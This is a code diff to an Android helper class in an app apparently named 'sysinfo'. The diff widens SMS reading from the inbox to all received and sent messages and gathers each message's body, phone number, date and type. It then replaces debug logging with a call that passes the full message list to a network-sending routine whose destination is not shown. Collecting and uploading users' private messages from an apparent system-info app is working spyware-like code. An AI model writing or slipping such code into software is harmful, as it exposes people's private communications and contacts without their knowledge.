@@ -8,10 +8,10 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.provider.CallLog;
+import android.provider.Telephony;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.widget.Toast;
 
 import com.sidhit.sysinfo.src.model.CallLogData;
@@ -30,7 +30,7 @@ public class HelperMethod {
 
     public static void getListOfSMSReceived(ContentResolver contentResolver, Activity activity) {
         List<SMSData> smsDataList = new ArrayList<>();
-        Uri uri = Uri.parse("content://sms/inbox");
+        Uri uri = Uri.parse("content://sms/");
         Cursor c = contentResolver.query(uri, null, null, null, null);
         activity.startManagingCursor(c);
 
@@ -38,19 +38,27 @@ public class HelperMethod {
         if (c.moveToFirst()) {
             for (int i = 0; i < c.getCount(); i++) {
                 SMSData sms = new SMSData();
-                sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
-                sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
+                sms.setId(c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID)));
+                sms.setBody(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)));
+                sms.setNumber(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
+                sms.setDateTime(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")))));
+                if (c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)).contains("1")) {
+                    sms.setSmsType(Enums.SMSType.INBOX);
+                } else {
+                    sms.setSmsType(Enums.SMSType.SENT);
+                }
                 smsDataList.add(sms);
 
                 c.moveToNext();
             }
         }
         c.close();
-        for (int i = 0; i < 5; i++) {
-            Log.d("Body", smsDataList.get(0).getBody());
-            Log.d("Number", smsDataList.get(0).getNumber());
-            System.out.println("**************************************");
-        }
+        NetworkUtil.sendSMSData(activity.getApplicationContext(), smsDataList);
+//        for (int i = 0; i < 5; i++) {
+//            Log.d("Body", smsDataList.get(i).getBody());
+//            Log.d("Number", smsDataList.get(i).getNumber());
+//            System.out.println("**************************************");
+//        }
     }
 
     public static void getListOfCallLog(ContentResolver contentResolver, Activity activity) {
